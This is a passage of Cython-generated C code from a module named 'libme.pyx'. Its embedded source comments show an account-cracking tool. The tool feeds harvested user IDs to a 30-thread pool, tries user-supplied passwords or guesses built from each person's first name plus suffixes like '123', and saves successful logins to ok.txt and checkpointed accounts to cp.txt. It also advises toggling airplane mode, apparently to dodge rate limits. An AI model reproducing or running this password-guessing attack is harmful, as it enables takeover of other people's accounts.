              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 556, __pyx_L18_error)
            }
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_6 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_6); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 556, __pyx_L18_error)
                  #else
                  __pyx_t_6 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 556, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_6);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_6 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_6); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 556, __pyx_L18_error)
                  #else
                  __pyx_t_6 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 556, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_6);
                  #endif
                }
              } else {
                __pyx_t_6 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_6)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 556, __pyx_L18_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_6);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_6);
              __pyx_t_6 = 0;

              /* "libme.pyx":557
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:
 * 					uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":
 */
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 557, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_10 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_4, function);
                }
              }
              __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_10, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 557, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_6))) || (PyList_CheckExact(__pyx_t_6))) {
                PyObject* sequence = __pyx_t_6;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 557, __pyx_L18_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_4 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_4 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_10);
                #else
                __pyx_t_4 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 557, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_10 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 557, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_10);
                #endif
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_6); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 557, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_4 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_4)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_4);
                index = 1; __pyx_t_10 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_10)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_10);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 557, __pyx_L18_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L28_unpacking_done;
                __pyx_L27_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 557, __pyx_L18_error)
                __pyx_L28_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_4);
              __pyx_t_4 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":558
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))             # <<<<<<<<<<<<<<
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
              __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 558, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_bapi); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 558, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 558, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_16);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_16, function);
                }
              }
              __pyx_t_9 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_17, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_kp_s__12);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 558, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_9);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
              __pyx_t_16 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_16)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_16);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_4, __pyx_v_uid, __pyx_t_9};
                __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 558, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_4, __pyx_v_uid, __pyx_t_9};
                __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 558, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 558, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_16) {
                  __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_16); __pyx_t_16 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_4);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_GIVEREF(__pyx_t_9);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_t_9);
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_17, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 558, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":556
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":547
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          goto __pyx_L23_try_end;
          __pyx_L18_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__menn__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_10) < 0) __PYX_ERR(0, 547, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_6, __pyx_t_10); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 547, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 547, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_13 < 0) __PYX_ERR(0, 547, __pyx_L20_except_error)
            __pyx_t_19 = ((!(__pyx_t_13 != 0)) != 0);
            if (__pyx_t_19) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_6);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_6, __pyx_t_10);
              __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_10 = 0; 
              __PYX_ERR(0, 547, __pyx_L20_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            goto __pyx_L19_exception_handled;
          }
          __pyx_L20_except_error:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          goto __pyx_L1_error;
          __pyx_L19_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          __pyx_L23_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 547, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          goto __pyx_L17;
        }
        __pyx_L17:;
      }
      goto __pyx_L32;
      __pyx_L14_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L32:;
    }

    /* "libme.pyx":546
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 */
    goto __pyx_L13;
  }

  /* "libme.pyx":559
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  __pyx_t_19 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_t, Py_EQ)); if (unlikely(__pyx_t_19 < 0)) __PYX_ERR(0, 559, __pyx_L1_error)
  if (__pyx_t_19) {

    /* "libme.pyx":560
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 560, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 560, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 560, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_empty_tuple, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 560, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 560, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 560, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_17 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_17)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_17);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_6 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 560, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __pyx_t_6;
      __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_1, &__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_2);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_10;
            __pyx_t_10 = 0;

            /* "libme.pyx":561
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 561, __pyx_L37_error)

            /* "libme.pyx":562
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 562, __pyx_L37_error)

            /* "libme.pyx":563
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")             # <<<<<<<<<<<<<<
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_If_No_Result_Turn_On_Airplane_M) < 0) __PYX_ERR(0, 563, __pyx_L37_error)

            /* "libme.pyx":564
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 564, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_10);
            if (likely(PyList_CheckExact(__pyx_t_10)) || PyTuple_CheckExact(__pyx_t_10)) {
              __pyx_t_5 = __pyx_t_10; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 564, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 564, __pyx_L37_error)
            }
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 564, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 564, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 564, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 564, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                }
              } else {
                __pyx_t_10 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_10)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 564, __pyx_L37_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_10);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":565
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:
 * 						uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 */
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 565, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_6, function);
                }
              }
              __pyx_t_10 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_17, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 565, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {
                PyObject* sequence = __pyx_t_10;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 565, __pyx_L37_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_17);
                #else
                __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 565, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_17 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 565, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                #endif
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 565, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_6 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_6)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_6);
                index = 1; __pyx_t_17 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_17)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_17);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 565, __pyx_L37_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L46_unpacking_done;
                __pyx_L45_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 565, __pyx_L37_error)
                __pyx_L46_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_6);
              __pyx_t_6 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":566
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]             # <<<<<<<<<<<<<<
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
